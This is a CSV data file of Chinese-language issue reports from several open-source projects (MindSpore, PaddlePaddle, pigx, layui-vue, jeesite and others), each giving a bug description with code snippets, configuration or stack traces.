title,text
Development_Preparation.md 中笔误？,源自 https://www.v2ex.com/t/596783#r_7837863 无法编译的注意： 文档中实际上是。   <code>: GN_AR GN_AR_COMPILER
收集数存在bug,"survey.setAnswerNum(answerNum+1);此处存在并发问题   <code>: public void saveAnswer(SurveyAnswer surveyAnswer, Map&lt;String, Map&lt;String, Object&gt;&gt; quMaps) { Date curDate=new Date(); Session session=this.getSession(); //保存答案信息 String surveyId=surveyAnswer.getSurveyId(); // Survey survey=(Survey) session.get(Survey.class, surveyId); SurveyDirectory survey=(SurveyDirectory) session.get(SurveyDirectory.class, surveyId); Integer answerNum = survey.getAnswerNum(); if(answerNum==null){ answerNum=0; } survey.setAnswerNum(answerNum+1); session.update(survey);//更新回答数"
pageHeader 组件 backIcon 插槽无法在 html 文件中使用,"pageHeader 组件 backIcon 插槽无法在 html 文件中使用 HTML 1.7.7   <code>: &lt;!DOCTYPE html&gt; &lt;html lang=""en""&gt; &lt;head&gt; &lt;meta charset=""UTF-8""&gt; &lt;meta http-equiv=""X-UA-Compatible"" content=""IE=edge""&gt; &lt;meta name=""viewport"" content=""width=device-width, initial-scale=1.0""&gt; &lt;link rel=""stylesheet"" type=""text/css"" href=""https://unpkg.com/@layui/layui-vue/lib/index.css""&gt; &lt;script type=""importmap""&gt; { ""imports"": { ""vue"": ""https://unpkg.com/vue@3/dist/vue.esm-browser.js"", ""layui"": ""https://unpkg.com/@layui/layui-vue/lib/index.js"" } } &lt;/script&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=""app""&gt; &lt;lay-page-header&gt; &lt;template v-slot:backIcon&gt;&lt;/template&gt; &lt;template v-slot:back-icon&gt; &lt;/template&gt; &lt;template v-slot:default&gt;标题&lt;/template&gt; &lt;/lay-page-header&gt; &lt;/div&gt; &lt;script type=""module""&gt; import {createApp} from 'vue' import Layui from 'layui' const App={ setup() { return { } }, } const app=createApp(App) app.use(Layui) app.mount('#app') &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;"
列表提交怎么实现,"表单提交列表属性的时候报错。目前有个办法是手动修改属性,如下，但是略麻烦些，请问下有更简便的方式吗？ org.springframework.beans.InvalidPropertyException: Invalid property 'list[0][id]' of bean class [com.jeesite.modules.biz.model.XXX]: Property referenced in indexed property path 'list[0][id]' is neither an array nor a List nor a Map; returned value was   <code>: list[0][id]: 1360824978603364352 list[0][name]: 6.4 list[1][id]: 1360824978683056128 list[1][name]: 3.125 改成 list[0].id: 1360824978603364352 list[0].name: 6.4 list[1].id: 1360824978683056128 list[1].name: 3.125 let list = []; for(i=0;i&lt;3;i++){ list.push({id : 1, name : 'n1'}); } js.ajaxSubmit('${ctxPath}/a/biz/xxx/update', {list:list}, function(data){ log(data) });"
导出excel  没有关闭loading，success不执行,"`js.ajaxSubmitForm($('#searchForm'), { url:'${ctx}/caterOrder/export', downloadFile:true, beforeSubmit: function () { js.loading('正在导出数据中，请您耐心等待....'); 导出excel 提示已经下载完成，没有关闭loading，success不执行，这里那里有问题吗？   <code>: }, success: function (data,status,xhr) { js.closeLoading(2000, true); }, error: function (error) { js.showErrorMessage(error); } });`"
属性重复,"CoreCms.Net.Web.Admin\wwwroot\views\content\customform\form\create.html CoreCms.Net.Web.Admin\wwwroot\views\content\customform\form\edit.html placeholder重复   <code>: &lt;textarea name=""description"" id=""description"" lay-verify=""required|verifydescription"" placeholder=""请输入内容"" class=""layui-textarea"" lay-reqText=""请输入表单描述"" placeholder=""请输入表单描述""&gt;&lt;/textarea&gt;"
TensorScatterUpdate算子对不同shape处理结果与pytorch的scatter_不一致,"运行结果： rr.mean()的输出   <code>: import torch import numpy as np from torch.nn import functional as fun if __name__ == '__main__': B, C, H, W = 37, 80, 28, 28 x = 784 mask_logits = np.random.random((B, C, H, W)) mask_logits_t = mask_logits mask_logits_m = mask_logits for _ in range(3): point_logits = np.random.random((B, C, x)) points_idx = np.random.randint(low=0, high=H * W, size=(B, x)) mask_logits_t = fun.interpolate( torch.Tensor(mask_logits_t), scale_factor=2, mode=""bilinear"", align_corners=False ) _, _, H, W = mask_logits_t.shape points_idx_ = torch.Tensor(points_idx).unsqueeze(1).expand(-1, C, -1).to(torch.int64) # (37, 80, 784) point_logits_ = torch.Tensor(point_logits) # (37, 80, 784) mask_logits_t = ( mask_logits_t.reshape(B, C, H * W) .scatter_(2, points_idx_, point_logits_) .view(B, C, H, W) ).cpu().numpy() from mindspore import ops, Tensor import mindspore cast = ops.Cast() mask_logits_m = fun.interpolate( torch.Tensor(mask_logits_m), scale_factor=2, mode=""bilinear"", align_corners=False ).cpu().numpy() # scatter_实现，使用ops.TensorScatterUpdate算子 scatter_ = ops.TensorScatterUpdate() zeros = ops.Zeros() points_index = zeros((B, x, 2), mindspore.int32) # (37, 784, 2) points_index[:, :, 0] = (Tensor(points_idx) % W).astype(mindspore.int32) points_index[:, :, 1] = (Tensor(points_idx) // W).astype(mindspore.int32) transpose = ops.Transpose() point_logits = transpose(Tensor(point_logits), (0, 2, 1)) # (37, 784, 80) mask_logits_m = transpose(Tensor(mask_logits_m), (0, 2, 3, 1)) # (37, H, W, 80) print(mask_logits_m.shape) mask_logits_m = cast(mask_logits_m, mindspore.float32) points_index = cast(points_index, mindspore.int32) point_logits = cast(point_logits, mindspore.float32) for b in range(B): mask_logits_m[b] = scatter_(mask_logits_m[b], points_index[b], point_logits[b]) mask_logits_m = transpose(mask_logits_m, (0, 3, 1, 2)).asnumpy() # print(mask_logits_m) rr = mask_logits_t - mask_logits_m rr = np.abs(rr) print(rr.mean())"
get_dataset_size 在有些参数下返回错误,": 依瞳系统下 device ascend /device gpu /device cpu : -- MindSpore version :mindspore-ascend 1.1.0 -- Python version : 发现升级到1.10版本后，mindspore.dataset ImageFolderDataset生成的数据集，在有extensions=["".jpg"", "".jpeg"", "".JPEG""] 参数的时候，get_dataset_size()会错误的返回0 ，而没有这个参数，返回正常。 hymenoptera_data 目录下是train目录，train目录下是两个目录，分别放着蜜蜂和蚂蚁的jpg图片。   <code>: import mindspore.dataset as ds import os data_path = ""./hymenoptera_data/"" batch_size = 32 ds_train = ds.ImageFolderDataset(os.path.join(data_path, ""train""), decode=True, extensions=["".jpg"", "".jpeg"", "".JPEG""] ) print(ds_train.get_dataset_size()) ds_train = ds_train.batch(batch_size, drop_remainder=True) print(ds_train.get_dataset_size()) ds_train = ds.ImageFolderDataset(os.path.join(data_path, ""train""), decode=True ) print(ds_train.get_dataset_size()) ds_train = ds_train.batch(batch_size, drop_remainder=True) print(ds_train.get_dataset_size()) 0 0 244 7"
 请问环境变量设置在哪里？,您好！请问下面文件描述的环境配置文件路径是在什么？谢谢! 1、IS_DEMO 设置环境变量 的值为 可以是PSI处于演示状态，在演示状态下admin用户的登录密码不能被修改，从而避免了演示环境被恶意破坏。 2、PSI_SESSION_IN_DB 设置环境变量 的值为 可以把Seesion保存在数据库中，这样在重启Web服务器后用户的登录信息仍能保存。 3、PSI_UnitTest   <code>: IS_DEMO 1 PSI_SESSION_IN_DB 1
运行pigx_gateway 报 org.yaml.snakeyaml.error.YAMLException: java.nio.charset.MalformedInputException: Input length = 1,"pigx版本: 3.0 操作系统: windows server 2012 R2 是否修改包名: 否 在开发环境(win7)运行pigx_gateway.jar不会出错 在测试环境(windows server 2012 R2)出现这错误 经百度，说是application-dev.yml里有中文，在nacos里将application-dev.yml中的中文去掉，运行正常 两个环境都是通过pigxx提供的SQL脚本构建的，尝试修改mysql的字符集，但都运行出错   <code>: 2019-06-11 11:31:24.452 INFO 5400 --- [ main] o.s.c.a.n.c.NacosPropertySourceBuilder : Loading nacos data, dataId: 'application-dev.yml', group: 'DEFAULT_GROUP' 2019-06-11 11:31:24.452 ERROR 5400 --- [ main] o.s.c.a.n.c.NacosPropertySourceBuilder : parse data from Nacos error,dataId:application-dev.yml,data:# 加解密根密码 jasypt: encryptor: password: pigx #根密码 # redis 相关 spring: redis: password: host: ${REDIS-HOST:pigx-redis} # 暴露监控端点 management: endpoints: web: exposure: include: '*' # feign 配置 feign: hystrix: enabled: true okhttp: enabled: true httpclient: enabled: false client: config: default: connectTimeout: 10000 readTimeout: 10000 compression: request: enabled: true response: enabled: true # hystrix If you need to use ThreadLocal bound variables in your RequestInterceptor`s # you will need to either set the thread isolation strategy for Hystrix to `SEMAPHORE or disable Hystrix in Feign. hystrix: command: default: execution: isolation: strategy: SEMAPHORE thread: timeoutInMilliseconds: 60000 shareSecurityContext: true #请求处理的超时时间 ribbon: ReadTimeout: 10000 ConnectTimeout: 10000 # mybaits-plus配置 mybatis-plus: # MyBatis Mapper所对应的XML文件位置 mapper-locations: classpath:/mapper/*Mapper.xml global-config: # 关闭MP3.0自带的banner banner: false db-config: # 主键类型 id-type: auto #swagger公共信息 swagger: title: PigX Swagger API description: 全宇宙最牛逼的Spring Cloud微服务开发脚手架 license: Powered By PigX licenseUrl: https://pig4cloud.com/ terms-of-service-url: https://pig4cloud.com/ contact: name: 冷冷 email: wangiegie@gmail.com url: https://pig4cloud.com/about.html authorization: name: pigX OAuth auth-regex: ^.*$ authorization-scope-list: - scope: server description: server all token-url-list: - http://${GATEWAY-HOST:pigx-gateway}:${GATEWAY-PORT:9999}/auth/oauth/token ## spring security 配置 security: oauth2: client: # 默认放行url,如果子模块重写这里的配置就会被覆盖 ignore-urls: - /actuator/** - /v2/api-docs resource: loadBalanced: true token-info-uri: http://${AUTH-HOST:pigx-auth}/oauth/check_token, org.yaml.snakeyaml.error.YAMLException: java.nio.charset.MalformedInputException: Input length = 1 at org.yaml.snakeyaml.reader.StreamReader.update(StreamReader.java:218) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.reader.StreamReader.ensureEnoughData(StreamReader.java:176) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.reader.StreamReader.ensureEnoughData(StreamReader.java:171) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.reader.StreamReader.peek(StreamReader.java:126) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.scanner.ScannerImpl.scanToNextToken(ScannerImpl.java:1177) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.scanner.ScannerImpl.fetchMoreTokens(ScannerImpl.java:287) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.scanner.ScannerImpl.checkToken(ScannerImpl.java:227) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.parser.ParserImpl$ParseImplicitDocumentStart.produce(ParserImpl.java:195) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.parser.ParserImpl.peekEvent(ParserImpl.java:158) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.parser.ParserImpl.checkEvent(ParserImpl.java:148) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.composer.Composer.checkNode(Composer.java:72) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.constructor.BaseConstructor.checkData(BaseConstructor.java:112) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.Yaml$1.hasNext(Yaml.java:542) ~[snakeyaml-1.23.jar!/:na] at org.springframework.beans.factory.config.YamlProcessor.process(YamlProcessor.java:160) ~[spring-beans-5.1.6.RELEASE.jar!/:5.1.6.RELEASE] at org.springframework.beans.factory.config.YamlProcessor.process(YamlProcessor.java:134) ~[spring-beans-5.1.6.RELEASE.jar!/:5.1.6.RELEASE] at org.springframework.beans.factory.config.YamlPropertiesFactoryBean.createProperties(YamlPropertiesFactoryBean.java:135) ~[spring-beans-5.1.6.RELEASE.jar!/:5.1.6.RELEASE] at org.springframework.beans.factory.config.YamlPropertiesFactoryBean.getObject(YamlPropertiesFactoryBean.java:115) ~[spring-beans-5.1.6.RELEASE.jar!/:5.1.6.RELEASE] at org.springframework.cloud.alibaba.nacos.client.NacosPropertySourceBuilder.loadNacosData(NacosPropertySourceBuilder.java:100) [spring-cloud-alibaba-nacos-config-0.9.0.RELEASE.jar!/:0.9.0.RELEASE] at org.springframework.cloud.alibaba.nacos.client.NacosPropertySourceBuilder.build(NacosPropertySourceBuilder.java:75) [spring-cloud-alibaba-nacos-config-0.9.0.RELEASE.jar!/:0.9.0.RELEASE] at org.springframework.cloud.alibaba.nacos.client.NacosPropertySourceLocator.loadNacosDataIfPresent(NacosPropertySourceLocator.java:179) [spring-cloud-alibaba-nacos-config-0.9.0.RELEASE.jar!/:0.9.0.RELEASE] at org.springframework.cloud.alibaba.nacos.client.NacosPropertySourceLocator.loadSharedConfiguration(NacosPropertySourceLocator.java:111) [spring-cloud-alibaba-nacos-config-0.9.0.RELEASE.jar!/:0.9.0.RELEASE] at org.springframework.cloud.alibaba.nacos.client.NacosPropertySourceLocator.locate(NacosPropertySourceLocator.java:86) [spring-cloud-alibaba-nacos-config-0.9.0.RELEASE.jar!/:0.9.0.RELEASE] at org.springframework.cloud.bootstrap.config.PropertySourceBootstrapConfiguration.initialize(PropertySourceBootstrapConfiguration.java:97) [spring-cloud-context-2.1.1.RELEASE.jar!/:2.1.1.RELEASE] at org.springframework.boot.SpringApplication.applyInitializers(SpringApplication.java:649) [spring-boot-2.1.4.RELEASE.jar!/:2.1.4.RELEASE] at org.springframework.boot.SpringApplication.prepareContext(SpringApplication.java:373) [spring-boot-2.1.4.RELEASE.jar!/:2.1.4.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:314) [spring-boot-2.1.4.RELEASE.jar!/:2.1.4.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1260) [spring-boot-2.1.4.RELEASE.jar!/:2.1.4.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1248) [spring-boot-2.1.4.RELEASE.jar!/:2.1.4.RELEASE] at com.pig4cloud.pigx.gateway.PigxGatewayApplication.main(PigxGatewayApplication.java:37) [classes!/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_162] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_162] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_162] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_162] at org.springframework.boot.loader.MainMethodRunner.run(MainMethodRunner.java:48) [pigx-gateway.jar:na] at org.springframework.boot.loader.Launcher.launch(Launcher.java:87) [pigx-gateway.jar:na] at org.springframework.boot.loader.Launcher.launch(Launcher.java:50) [pigx-gateway.jar:na] at org.springframework.boot.loader.JarLauncher.main(JarLauncher.java:51) [pigx-gateway.jar:na] Caused by: java.nio.charset.MalformedInputException: Input length = 1 at java.nio.charset.CoderResult.throwException(CoderResult.java:281) ~[na:1.8.0_162] at sun.nio.cs.StreamDecoder.implRead(StreamDecoder.java:339) ~[na:1.8.0_162] at sun.nio.cs.StreamDecoder.read(StreamDecoder.java:178) ~[na:1.8.0_162] at java.io.InputStreamReader.read(InputStreamReader.java:184) ~[na:1.8.0_162] at org.yaml.snakeyaml.reader.UnicodeReader.read(UnicodeReader.java:125) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.reader.StreamReader.update(StreamReader.java:183) ~[snakeyaml-1.23.jar!/:na] ... 36 common frames omitted"
user requested cancel of current operation,"使用updateByExampleSelective时，偶会出现Caused by: java.sql.SQLException: ORA-01013: user requested cancel of current operation 的错误   <code>: wlqdKpxxDetailParamDO = new WlqdKpxxDetailDO(); wlqdKpxxDetailParamDO.setFpzt(InvoiceStatusEnum.YKPWDY.dm); wlqdKpxxDetailParamDO.setZhxgsj(new Date()); Example wlqdKpxxDetailExample = new Example(WlqdKpxxDetailDO.class); wlqdKpxxDetailExample.createCriteria().andEqualTo(""fpId"", orderInvoiceDTO.getPjId()); wlqdKpxxDetailDAO.updateByExampleSelective(wlqdKpxxDetailParamDO, wlqdKpxxDetailExample);"
飞桨2.0.0RC1 高层API例程报错,"在AIStudio项目版本升级到2.0.0RC1后，发现原来2.0.0.RC0下运行正常的程序报错，到手册找到rc1版本的高层api例程，同样报错。 AIStudio项目版本升级应该是内部升的，现在不管是以前创建的2.0环境，还是新创建项目选择2.0，进入之后都是RC1版本。 高层api例程地址：https://www.paddlepaddle.org.cn/documentation/docs/zh/2.0-rc1/guides/01_paddle2.0_introduction/upgrade_guide_cn.html#id12 项目地址：https://aistudio.baidu.com/aistudio/projectdetail/1222066 报错如下： paddle.distributed.init_parallel_envpaddle.distributed.init_parallel_env` will not do anything."" WARNING:root:DataLoader reader thread raised an exception. Exception in thread Thread-4: Traceback (most recent call last): File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/threading.py"", line 926, in _bootstrap_inner self.run() File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/threading.py"", line 870, in run self._target(*self._args, **self._kwargs) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 338, in _thread_loop six.reraise(*sys.exc_info()) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/six.py"", line 703, in reraise raise value File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 308, in _thread_loop batch = self._dataset_fetcher.fetch(indices) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/fetcher.py"", line 65, in fetch data = self.collate_fn(data) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 95, in default_collate_fn raise RuntimeError(""Unknown data type {}"".format(type(slot[0]))) RuntimeError: Unknown data type &lt;class 'PIL.Image.Image'&gt; The loss value printed in the log is the current step, and the metric is the average value of previous step. Epoch 1/2 ---------------------------------------------------------------------------SystemError Traceback (most recent call last) in 16 17 # 启动训练 ---&gt; 18 model.fit(train_dataset, epochs=2, batch_size=64, log_freq=200) 19 20 # 启动评估 /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/hapi/model.py in fit(self, train_data, eval_data, batch_size, epochs, eval_freq, log_freq, save_dir, save_freq, verbose, drop_last, shuffle, num_workers, callbacks) 1490 for epoch in range(epochs): 1491 cbks.on_epoch_begin(epoch) -&gt; 1492 logs = self._run_one_epoch(train_loader, cbks, 'train') 1493 cbks.on_epoch_end(epoch, logs) 1494 /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/hapi/model.py in _run_one_epoch(self, data_loader, callbacks, mode, logs) 1774 def _run_one_epoch(self, data_loader, callbacks, mode, logs={}): 1775 outputs = [] -&gt; 1776 for step, data in enumerate(data_loader): 1777 # data might come from different types of data_loader and have 1778 # different format, as following: /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py in next(self) 354 try: 355 if in_dygraph_mode(): --&gt; 356 return self.<em>reader.read_next_var_list() 357 else: 358 if self.<em>return_list: SystemError: (Fatal) Blocking queue is killed because the data reader raises an exception. [Hint: Expected killed</em> != true, but received killed</em>:1 == true:1.] (at /paddle/paddle/fluid/operators/reader/blocking_queue.h:154) [Hint: If you need C++ stacktraces for debugging, please set .]`   <code>: /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/distributed/parallel.py:119: UserWarning: Currently not a parallel execution environment, will not do anything. ""Currently not a parallel execution environment, FLAGS_call_stack_level=2"
[ST][MS][modelzoo][dcn][gpu] dcn在gpu环境训练失败,"dcn在gpu环境训练失败 / 硬件环境: /device GPU : -- MindSpore version :master commit_id:cde09ee9 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_dcn_dynamic_train_infer_gpu_1p_0001.py pytest -s test_ms_dcn_dynamic_train_infer_gpu_1p_0001.py 训练推理成功 转给金修浪   <code>: [CRITICAL] CORE(38656,7f3ca90f6740,python):2022-10-25-10:40:12.667.887 [mindspore/core/ops/reshape.cc:68] update_shape] The accumulate of x_shape must be equal to out_shape, but got x_shape: [const vector][], and out_shape: [const vector][2] [WARNING] MD(38656,7f3ca90f6740,python):2022-10-25-10:40:12.739.064 [mindspore/ccsrc/minddata/dataset/engine/datasetops/data_queue_op.cc:93] ~DataQueueOp] preprocess_batch: 3; batch_queue: 0, 0, 5, 5, 5, 4, 16; push_start_time: 2022-10-25-10:40:11.155.792, 2022-10-25-10:40:11.548.069, 2022-10-25-10:40:11.548.147; push_end_time: 2022-10-25-10:40:11.548.061, 2022-10-25-10:40:11.548.142, 2022-10-25-10:40:12.737.872. Traceback (most recent call last): File ""main.py"", line 49, in &lt;module&gt; trainer.train() File ""/home/jenkins0/solution_test/cases/02network/09audio/dcn/train/test_ms_dcn_dynamic_train_infer_gpu_1p_0001/dcn_ms_trainer.py"", line 103, in train model.train(self.num_epochs, dataset, callbacks=callback_list) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 1062, in train initial_epoch=initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 98, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 624, in _train cb_params, sink_size, initial_epoch, valid_infos) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 702, in _train_dataset_sink_process outputs = train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 619, in __call__ out = self.compile_and_run(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 1004, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 976, in compile jit_config_dict=self._jit_config_dict) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1150, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) ValueError: The accumulate of x_shape must be equal to out_shape, but got x_shape: [const vector][], and out_shape: [const vector][2]"
一个页面两个bootstrap-table都需要触发responseHandler，两个函数获取data或取值undifiend,"一个页面两个bootstrap-table都需要触发responseHandler，两个函数获取data赋值会都是undifiend，然后需要点击form查询才能出来，如果是一个table就正常 responseHandler: function (data1) { $('#countSum1').html(''); $('#totalFeeSum1').html(''); $('#sealtSum1').html(''); if (data1.code = ""00000"") { $('#countSum1').html('累计销量：'+data1.countSum1+' 件'); $('#totalFeeSum1').html('累计订单总额：'+data1.totalFeeSum1+' 元'); $('#sealtSum1').html('累计结算总额：'+data1.sealtSum1+' 元'); } }   <code>: responseHandler: function (data2) { $('#countSum2').html(''); $('#totalFeeSum2').html(''); if (data2.code = ""00000"") { $('#countSum2').html('累计商品数量 ：'+data2.countSum2+' 件'); $('#totalFeeSum2').html('累计金额小计：'+data2.totalFeeSum2+' 元'); } }"
[MDT][PERF]resample算子特定场景下性能比不过对标librose,"在gcd值（orig_freq和new_freq的最小公约数）偏小的情况下,MindData算子resample的性能比不过对标框架 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version :commit_id = '[sha1]:e2c89157,[branch]:(HEAD,origin/master,origin/HEAD,master)' -- Python version :Python 3.7.5 -- OS platform and distribution :Ubuntu 18.04.6 LTS -- GCC/Compiler version : gcc (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0 (/): 修改参数值，执行脚本 minddata time &lt; librose time 见附件   <code>: import numpy as np from mindspore import log as logger import mindspore.dataset as ds import mindspore.dataset.audio.transforms as audio from mindspore.dataset.audio.utils import ResampleMethod import librosa import time import torch import torchaudio.functional import math from torch.utils.data import Dataset def testEagerTorchAudio(input_shape, orig_freq, new_freq): waveform = np.random.rand(*input_shape) * 100 orig_freq = orig_freq sleep_time = 10 new_freq = new_freq times2 = 100 print(""waveform.shape"", waveform.shape) print(""orig_freq:"", orig_freq) print(""new_freq:"", new_freq) print(""gcd:"", math.gcd(orig_freq, new_freq)) time.sleep(sleep_time) start_time = time.time() for i in range(times2): audio.Resample(orig_freq=orig_freq, new_freq=new_freq)(waveform) end_time = time.time() output1 = audio.Resample(orig_freq=orig_freq, new_freq=new_freq)(waveform) print(""minddata time over "", times2, "" runs is "", (end_time - start_time) / times2 * 1000 ** 2, ""?s"") time.sleep(sleep_time) times = 100 start_time = time.time() for i in range(times): librosa.core.resample(waveform, orig_sr=orig_freq, target_sr=new_freq) end_time = time.time() print(""librosa resample average time over"", times, ""runs is "", (end_time - start_time) / times * 1000 ** 2, ""?s"") time.sleep(sleep_time) waveform2 = torch.from_numpy(waveform) start_time = time.time() times3 = 1 for i in range(times3): torchaudio.functional.resample(waveform2, orig_freq=orig_freq, new_freq=new_freq) end_time = time.time() output3 = torchaudio.functional.resample(waveform2, orig_freq=orig_freq, new_freq=new_freq) output3 = output3.detach().numpy() print(""pytorch time over "", times3, ""runs is "", (end_time - start_time) / times3 * 1000 ** 2, ""?s"") print(abs(output3 - output1)) assert (np.all(output1 - output3 &lt; 1e-5)) if __name__ == '__main__': if __name__ == '__main__': test_data = [{""waveform"": (1000, 1000), ""orig_freq"": 16000, ""new_freq"": 160000}, {""waveform"": (1000, 1000), ""orig_freq"": 16000, ""new_freq"": 48000}, {""waveform"": (1000, 1000), ""orig_freq"": 16000, ""new_freq"": 8000}, {""waveform"": (1000, 1000), ""orig_freq"": 16000, ""new_freq"": 11000}, {""waveform"": (1000, 1000), ""orig_freq"": 16000, ""new_freq"": 500}, {""waveform"": (1000, 1000), ""orig_freq"": 16000, ""new_freq"": 11025}, {""waveform"": (1000, 1000), ""orig_freq"": 16000, ""new_freq"": 11005}, {""waveform"": (1000, 1000), ""orig_freq"": 22050, ""new_freq"": 44100}, {""waveform"": (1000, 1000), ""orig_freq"": 22050, ""new_freq"": 11025}, {""waveform"": (1000, 1000), ""orig_freq"": 22050, ""new_freq"": 500}, {""waveform"": (1000, 1000), ""orig_freq"": 22050, ""new_freq"": 11005}, {""waveform"": (17, 12345), ""orig_freq"": 16000, ""new_freq"": 160000}, {""waveform"": (17, 12345), ""orig_freq"": 16000, ""new_freq"": 48000}, {""waveform"": (17, 12345), ""orig_freq"": 16000, ""new_freq"": 8000}, {""waveform"": (17, 12345), ""orig_freq"": 16000, ""new_freq"": 11000}, {""waveform"": (17, 12345), ""orig_freq"": 16000, ""new_freq"": 500}, {""waveform"": (17, 12345), ""orig_freq"": 16000, ""new_freq"": 11025}, {""waveform"": (17, 12345), ""orig_freq"": 16000, ""new_freq"": 11005}, {""waveform"": (16560,), ""orig_freq"": 24000, ""new_freq"": 48000}, {""waveform"": (16560,), ""orig_freq"": 24000, ""new_freq"": 16000}, {""waveform"": (16560,), ""orig_freq"": 24000, ""new_freq"": 1600}, {""waveform"": (16560,), ""orig_freq"": 24000, ""new_freq"": 11025}, {""waveform"": (16560,), ""orig_freq"": 24000, ""new_freq"": 11005}, {""waveform"": (7432986,), ""orig_freq"": 16000, ""new_freq"": 48000}, {""waveform"": (7432986,), ""orig_freq"": 16000, ""new_freq"": 24000}, {""waveform"": (7432986,), ""orig_freq"": 16000, ""new_freq"": 1600}, {""waveform"": (7432986,), ""orig_freq"": 16000, ""new_freq"": 11025}, {""waveform"": (241840,), ""orig_freq"": 16000, ""new_freq"": 48000}, {""waveform"": (241840,), ""orig_freq"": 16000, ""new_freq"": 24000}, {""waveform"": (241840,), ""orig_freq"": 16000, ""new_freq"": 1600}, {""waveform"": (241840,), ""orig_freq"": 16000, ""new_freq"": 11025}, {""waveform"": (241840,), ""orig_freq"": 16000, ""new_freq"": 11005}, {""waveform"": (2, 125800), ""orig_freq"": 22050, ""new_freq"": 11025}, {""waveform"": (2, 125800), ""orig_freq"": 22050, ""new_freq"": 44100}, ] for data in test_data: testEagerTorchAudio(input_shape=data[""waveform""], orig_freq=data[""orig_freq""], new_freq=data[""new_freq""])"
u-button导致点击事件需要点击两次,子组件用到，把点击事件传给父组件，点击父组件的事件时，需点击两次才生效，可能是嵌套太深导致的，希望修复该问题   <code>: u-button
[CT][MS][CPU]Failure info [invalid output_idx].,"Failure info [invalid output_idx]. / 硬件环境: /device CPU : -- MindSpore version :master-46217 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph pytest -s parse/test_parser_builtin_1.py::test_fallback_tuple_with_input_tensor case pass   <code>: def test_fallback_tuple_with_input_tensor(): contextbase.case_prepare() @numpy_native_wrapper() def func(): x = tuple(Tensor([1, 2])) y = () return x, y &gt; out, out_y = func() self = &lt;mindspore.common.api._MindsporeFunctionExecutor object at 0x7fe4c4308110&gt; args = (), args_list = () phase = 'MindSporeTest.share.utils.func_graph./home/jenkins-slave/workspace/MindSpore_ME_Version_Featrue_Daily_EulerOS_CPU/MindSporeTest/share/utils.py.506.1670454935943419904.2' @_wrap_func def __call__(self, *args): args_list = args if self.obj is not None: args_list = args_list[1:] try: _pynative_executor.set_ms_function_compile_status(True) phase = self.compile(args_list, self.fn.__name__) _pynative_executor.set_ms_function_compile_status(False) except Exception as err: _pynative_executor.clear_res() raise err if context.get_context(""precompile_only""): return None new_inputs = self._generate_run_args(args_list) &gt; output = self._graph_executor(tuple(new_inputs), phase) E RuntimeError: Failure info [invalid output_idx]. E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/utils/anfalgo.cc:708 GetOutputObjectType /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:309: RuntimeError"
富文本内容被转义导致格式丢失的问题,更新到最新框架后，原来正常的使用了UEditor组件编辑后，换行以及等标签都丢失了。   <code>: &lt;hr/&gt;&lt;center&gt;
